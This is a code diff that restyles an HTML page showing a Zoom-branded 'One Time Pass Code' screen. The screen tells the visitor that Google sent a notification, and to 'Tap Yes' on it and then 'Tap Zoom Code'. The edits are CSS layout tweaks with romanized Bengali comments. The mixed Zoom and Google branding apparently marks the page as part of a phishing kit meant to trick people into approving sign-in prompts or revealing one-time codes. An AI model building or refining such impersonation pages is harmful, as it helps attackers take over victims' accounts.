@@ -23,66 +23,74 @@
       overflow: hidden;
     }
 
-    /* iPhone 12 ebong mobile screen er jonno 100dvh use kora holo */
+    /* Container puro screen jure thakbe */
     .container {
       width: 100%;
       height: 100dvh;
+      height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: space-between;
+      align-items: center;
       text-align: center;
-      padding: 2.5vh 5vw;
+      padding: 2.5vh 5vw 3vh 5vw;
       background: #ffffff;
     }
 
+    /* Content box screen size onujayi auto adjust hobe */
     .content-box {
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: space-around;
       width: 100%;
       flex: 1;
-      justify-content: center;
+      min-height: 0;
     }
 
     /* Top Logo */
     .logo {
-      width: 12vw;
-      max-width: 55px;
+      width: 11vw;
+      max-width: 50px;
       height: auto;
       object-fit: contain;
-      margin-bottom: 1.5vh;
       border-radius: 50%;
     }
 
     /* Main Title */
     h1 {
-      font-size: clamp(18px, 4.5vw, 22px);
+      font-size: clamp(18px, 4.8vw, 23px);
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 2vh;
     }
 
-    /* Phone Graphic Illustration */
+    /* Phone Graphic Illustration (Screen size onujayi boro ebong perfect) */
     .phone-illustration {
-      width: 40vw;
-      max-width: 165px;
+      width: 44vw;
+      max-width: 185px;
       height: auto;
+      max-height: 32vh;
       object-fit: contain;
-      margin-bottom: 2vh;
+    }
+
+    /* Text Group */
+    .text-group {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     /* Sub Heading */
     h2 {
-      font-size: clamp(16px, 4vw, 19px);
+      font-size: clamp(16px, 4.2vw, 20px);
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 1vh;
+      margin-bottom: 6px;
     }
 
     /* Description Text */
     .desc-text {
-      font-size: clamp(14px, 3.5vw, 15.5px);
+      font-size: clamp(13.5px, 3.6vw, 15.5px);
       font-weight: 600;
       color: #1f2937;
       line-height: 1.4;
@@ -93,13 +101,13 @@
       color: #000000;
     }
 
-    /* Resend Button */
+    /* Resend Button - Nicher dike fix thakbe */
     .btn-join {
       background-color: #007aff;
       color: white;
       padding: 14px 0;
       width: 100%;
-      max-width: 330px;
+      max-width: 340px;
       font-size: 16px;
       font-weight: bold;
       border: none;
@@ -107,7 +115,7 @@
       cursor: pointer;
       box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);
       transition: background-color 0.2s, transform 0.1s;
-      margin-top: 1vh;
+      flex-shrink: 0;
     }
 
     .btn-join:hover {
@@ -126,12 +134,14 @@
       <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
       <h1>One Time Pass Code</h1>
       <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
-      <h2>Check your phone.</h2>
-      <p class="desc-text">
-        Google sent a notification to your phone.<br>
-        <span>Tap Yes</span> on the notification<br>
-        Then Tap Zoom Code
-      </p>
+      <div class="text-group">
+        <h2>Check your phone.</h2>
+        <p class="desc-text">
+          Google sent a notification to your phone.<br>
+          <span>Tap Yes</span> on the notification<br>
+          Then Tap Zoom Code
+        </p>
+      </div>
     </div>
 
     <button class="btn-join" onclick="window.location.href='../'">Resend</button>
